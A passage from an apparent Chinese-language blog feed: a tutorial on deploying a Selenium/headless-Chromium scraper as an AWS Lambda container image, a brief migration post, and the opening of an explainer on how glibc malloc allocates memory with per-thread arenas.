class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir app</span><br><span class="line">cd app</span><br><span class="line">vim app.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">event, context</span>):</span><br><span class="line"></span><br><span class="line">    chrome_options = Options()</span><br><span class="line">    </span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--autoplay-policy=user-gesture-required&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-background-networking&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-background-timer-throttling&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-backgrounding-occluded-windows&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-breakpad&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-client-side-phishing-detection&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-component-update&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-default-apps&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-dev-shm-usage&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-domain-reliability&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-extensions&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-features=AudioServiceOutOfProcess&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-hang-monitor&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-ipc-flooding-protection&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-notifications&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-offer-store-unmasked-wallet-cards&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-popup-blocking&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-print-preview&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-prompt-on-repost&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-renderer-backgrounding&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-speech-api&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disable-sync&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disk-cache-size=33554432&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--hide-scrollbars&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--ignore-gpu-blacklist&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--ignore-certificate-errors&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--metrics-recording-only&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--mute-audio&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-default-browser-check&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-first-run&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-pings&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-sandbox&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--no-zygote&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--password-store=basic&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--use-gl=swiftshader&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--use-mock-keychain&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--single-process&#x27;</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--user-data-dir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/user-data&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--data-path=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/data-path&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--homedir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp&#x27;</span>))</span><br><span class="line">    chrome_options.add_argument(<span class="string">&#x27;--disk-cache-dir=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;/tmp/cache-dir&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">    driver = webdriver.Chrome(</span><br><span class="line">        executable_path=<span class="string">&#x27;/usr/bin/chromedriver&#x27;</span>,</span><br><span class="line">        options=chrome_options)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> driver:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Selenium Driver Initiated&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    response = &#123;</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: json.dumps(html, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure><p>Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define global args</span></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR=<span class="string">&quot;/home/app/&quot;</span></span><br><span class="line"><span class="keyword">ARG</span> RUNTIME_VERSION=<span class="string">&quot;3.9&quot;</span></span><br><span class="line"><span class="keyword">ARG</span> DISTRO_VERSION=<span class="string">&quot;3.12&quot;</span></span><br><span class="line"><span class="comment"># Stage 1</span></span><br><span class="line"><span class="keyword">FROM</span> python:$&#123;RUNTIME_VERSION&#125;-alpine$&#123;DISTRO_VERSION&#125; AS python-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache \</span></span><br><span class="line"><span class="language-bash">    libstdc++</span></span><br><span class="line"><span class="comment"># Stage 2</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine AS build-image</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache \</span></span><br><span class="line"><span class="language-bash">    build-base \</span></span><br><span class="line"><span class="language-bash">    libtool \</span></span><br><span class="line"><span class="language-bash">    autoconf \</span></span><br><span class="line"><span class="language-bash">    automake \</span></span><br><span class="line"><span class="language-bash">    libexecinfo-dev \</span></span><br><span class="line"><span class="language-bash">    make \</span></span><br><span class="line"><span class="language-bash">    cmake \</span></span><br><span class="line"><span class="language-bash">    libcurl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"><span class="keyword">ARG</span> RUNTIME_VERSION</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python<span class="variable">$&#123;RUNTIME_VERSION&#125;</span> -m pip install awslambdaric --target <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage 3</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine as build-image2</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build-image <span class="variable">$&#123;FUNCTION_DIR&#125;</span> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add gcc python3-dev musl-dev \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add jpeg-dev zlib-dev libjpeg-turbo-dev</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> python<span class="variable">$&#123;RUNTIME_VERSION&#125;</span> -m pip install -r requirements.txt --target <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"><span class="comment"># Stage 4</span></span><br><span class="line"><span class="keyword">FROM</span> python-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">ARG</span> FUNCTION_DIR</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build-image2 <span class="variable">$&#123;FUNCTION_DIR&#125;</span> <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add jpeg-dev zlib-dev libjpeg-turbo-dev \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apk add chromium chromium-chromedriver</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> https://github.com/aws/aws-lambda-runtime-interface-emulator/releases/latest/download/aws-lambda-rie /usr/bin/aws-lambda-rie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> 755 /usr/bin/aws-lambda-rie</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app/* <span class="variable">$&#123;FUNCTION_DIR&#125;</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> entry.sh /</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [ <span class="string">&quot;/entry.sh&quot;</span> ]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;app.handler&quot;</span> ]</span></span><br></pre></td></tr></table></figure><p>建構 Image</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t awsLambdacrawler .</span><br></pre></td></tr></table></figure><p>一但建構完成後可以透過指令查看是否建構成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure><h2 id="測試容器"><a href="#測試容器" class="headerlink" title="測試容器"></a>測試容器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 9000:8080 &lt;IMAGE_ID&gt;</span><br></pre></td></tr></table></figure><p>輸出結果會像是這樣<br><img src="https://i.imgur.com/QlxN5Cu.jpg" alt="Imgur"></p><p>此時可以再開一個 Terminal 來去 invoke 看看請求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST &quot;http://localhost:9000/2015-03-31/functions/function/invocations&quot; -d &#x27;&#123;&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ciclBUc.jpg" alt="Imgur"></p><p>接著去建立 <strong>ECR Repository</strong>（在 Local Macbook）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr create-repository --repository-name cx-lambda --image-scanning-configuration scanOnPush=true</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag awsLambdacrawler:latest &lt;ENTER YOUR CONTAINER REPOSITORY URI&gt;:latest</span><br></pre></td></tr></table></figure><p>接著我在 Local Macbook 查看 ECR 密碼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ecr get-login-password </span><br></pre></td></tr></table></figure><p>將密碼複製起來</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login &lt;YOUR AWS ACCOUNT ID&gt;.dkr.ecr.&lt;YOUR REGION&gt;.amazonaws.com (http://amazonaws.com/)&gt;</span><br></pre></td></tr></table></figure><ul><li>username: AWS</li><li>password:  剛剛複製的密碼</li></ul><p>將 Image 推上 Repository</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push  &lt;YOUR AWS ACCOUNT ID&gt;.dkr.ecr.&lt;YOUR REGION&gt;.amazonaws.com (http://amazonaws.com/)</span><br></pre></td></tr></table></figure><p>可以去 ECR Console 上查看<br><img src="https://i.imgur.com/mBqWiCX.jpg" alt="Imgur"></p><h2 id="建立-Lambda"><a href="#建立-Lambda" class="headerlink" title="建立 Lambda"></a>建立 Lambda</h2><p>去 Lambda Console &gt; Create Function &gt; Container Image</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function Name: ScrappingfromImage</span><br><span class="line">Container image URI: 125657041963.dkr.ecr.us-east-1.amazonaws.com/cx-lambda:latest</span><br></pre></td></tr></table></figure><h3 id="設定-Lambda-網路存取"><a href="#設定-Lambda-網路存取" class="headerlink" title="設定 Lambda  網路存取"></a>設定 Lambda  網路存取</h3><p>若想要 Lambda Function 連接到外部網路，不同於EC2，你需要將 Lambda attach 到你自己的 VPC，並且需要把 Lambda 放到 private gateway，並且該 Private Gateway 必須要設定路由表中的預設路由到一個 <strong>NAT Gateway</strong>。<br>因為 Lambda 在連接到某個 VPC時會去建立一個 ENI，那個ENI預設只吃 Priavte IP，因此會需要一個 NAT Gateway 來進行公有私有IP的轉換，並且會透過一個叫 V2N 的功能來去連接到 NAT Gateway。</p><blockquote><p>有興趣的話可以參考這兩份官方文件，裡面對 Lambda 的聯網機制有詳細介紹<br><a href="https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/foundation-networking.html">https://docs.aws.amazon.com/zh_tw/lambda/latest/dg/foundation-networking.html</a><br><a href="https://aws.amazon.com/tw/blogs/compute/announcing-improved-vpc-networking-for-aws-lambda-functions/">https://aws.amazon.com/tw/blogs/compute/announcing-improved-vpc-networking-for-aws-lambda-functions/</a></p></blockquote><p>這邊用流程圖展示的話會是這樣:</p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>    flowchart LR    subgraph Custom VPC        direction LR        c1(Lambda) ---&gt; a2(NATGateway)        subgraph Public Subnet            direction LR            a2(NATGateway)        end        subgraph Private Subnet            direction LR            c1(Lambda)        end    end  </pre></div><p><img src="https://i.imgur.com/7suZcAG.jpg" alt="Imgur"></p><p>private route<br><img src="https://i.imgur.com/DAMgy23.jpg" alt="Imgur"></p><h3 id="設定-Lambda-Permission"><a href="#設定-Lambda-Permission" class="headerlink" title="設定 Lambda Permission"></a>設定 Lambda Permission</h3><p>要記得幫 Lambda 添加 <code>VPCAccessExecutionRole</code> 這個 Permission</p><p>接著就是測試 code</p><p>但可以先去 Configuration &gt; General Configuration &gt; Timeout  把 timeout 調高</p><blockquote><p>Timeout: 20 sec</p></blockquote><h2 id="測試-Lambda"><a href="#測試-Lambda" class="headerlink" title="測試 Lambda"></a>測試 Lambda</h2><p><img src="https://i.imgur.com/fVsALwS.jpg" alt="Imgur"></p><p>成功</p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Amazon </tag>
            
            <tag> Lambda </tag>
            
            <tag> 網頁爬蟲 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇文章</title>
      <link href="/posts/7a776471.html"/>
      <url>/posts/7a776471.html</url>
      
        <content type="html"><![CDATA[<h1 id="從-Hugo-移植到-Hexo"><a href="#從-Hugo-移植到-Hexo" class="headerlink" title="從 Hugo 移植到 Hexo"></a>從 Hugo 移植到 Hexo</h1><p>之前在 Hugo 雖然就挺方便的，但這個 Butterfly 主題真的太贊了，就先移植過來玩看看</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>🗃️Deep Dive: malloc 函式如何進行記憶體分配</title>
      <link href="/posts/78d9b0c6.html"/>
      <url>/posts/78d9b0c6.html</url>
      
        <content type="html"><![CDATA[<h1 id="Deep-Dive-malloc-函式如何進行記憶體分配"><a href="#Deep-Dive-malloc-函式如何進行記憶體分配" class="headerlink" title="Deep Dive: malloc 函式如何進行記憶體分配?"></a>Deep Dive: malloc 函式如何進行記憶體分配?</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>動態記憶體配置是一個重要的概念。它讓程式可以在執行期間根據需要動態地分配和釋放記憶體，而不必依賴於事先靜態分配的記憶體區塊。這樣的彈性使程式能夠更有效地利用記憶體資源，並處理各種大小和複雜性的問題。</p><p>C語言中的malloc函式是一個廣泛使用的動態記憶體分配函式。它允許程式設計師在執行期間動態地分配指定大小的記憶體區塊。malloc的一個重要特性是它能夠確保分配的記憶體區塊在使用期間是有效和可存取的，同時適當地釋放它們以避免記憶體洩漏。</p><p>然而，你或許好奇malloc函式在底層是如何實現記憶體分配的，要如何準確動態分配空出的記憶體給caller?。這就是我們將在本文中深入探討的主題。我們將著重於malloc函式的底層實現，特別是當我們呼叫malloc時，系統如何決定和分配一塊合適的記憶體位址給我們使用。</p><p>在探討這個問題之前，讓我們先回顧一下動態記憶體配置的基本概念。在C語言中，我們可以使用malloc函式來動態地分配記憶體。它的函式原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><p>malloc函式接受一個正整數參數size，代表我們希望分配的記憶體區塊大小（以位元組為單位）。它會嘗試找到一塊足夠大的連續記憶體區塊，並將其標記為已分配。如果成功找到一塊合適的記憶體區塊，malloc函式將返回指向該區塊開頭的指標；否則，它將返回NULL表示分配失敗。</p><p>雖然malloc函式看起來相對簡單，但其底層的實現是一個複雜的任務。不同的作業系統和編譯器可能使用不同的演算法和策略來執行記憶體分配。因此，我們將深入研究這些內部機制，以了解malloc函式是如何進行記憶體分配的，並探討其優缺點及效能影響。</p><p>接下來，我們將進入malloc函式的底層世界，一同揭開它背後的神秘面紗。我們將探討幾種常見的記憶體分配演算法，包括固定分割、動態分割以及頁面分割等等。這些演算法將幫助我們更好地理解malloc函式的工作方式，並瞭解如何優化記憶體使用效能。</p><p><img src="https://i.imgur.com/8lB2IrU.png"></p><p>隨著這個問題我們可以深入挖掘它的原理</p><h2 id="如何進行記憶體分配"><a href="#如何進行記憶體分配" class="headerlink" title="如何進行記憶體分配"></a>如何進行記憶體分配</h2><p>作業系統中的記憶體分配功能主要是靠記憶體分配器(Memory Allocator) 來實現，在早期glibc預設的記憶體分配器是 <code>dlmalloc</code></p><p>但<code>dlmalloc</code> 有個問題，一旦有多個Thread呼叫Malloc，只能有一個Thread可以進入Critical Section。而改進這個問題的就是從<code>dlmalloc</code>中fork出來的<code>ptmalloc2</code>，一旦多個Thread呼叫malloc，則會立即分配記憶體給個別Thread。</p><p>由於記憶體分配的任務基本上是會存在於多個Thread之間，因此<code>dlmalloc</code>很容易造成效能低落。在<code>ptmalloc2</code>中，多個Thread同時呼叫malloc時，記憶體會被立刻分配，因為每個Thread會維護單獨的堆疊區段，而維護每個堆疊區段的freelist 資料結構也同樣是個別獨立的。</p><p>這種維護個別freelist結構以及heap區段的行為叫做 <strong>per thread areana</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="type">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="type">char</span>* addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">pthread_t</span> t1;</span><br><span class="line">        <span class="type">void</span>* s;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="type">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,<span class="built_in">getpid</span>());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        ret = <span class="built_in">pthread_create</span>(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = <span class="built_in">pthread_join</span>(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>編譯並執行程式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c mythread -lpthread -o mythread</span><br><span class="line"></span><br><span class="line">./mythread</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/qeTHI16.png"></p><p>可以根據PID來查看行程的記憶體分配狀況<br>根據上面程式輸出提示其PID為74</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 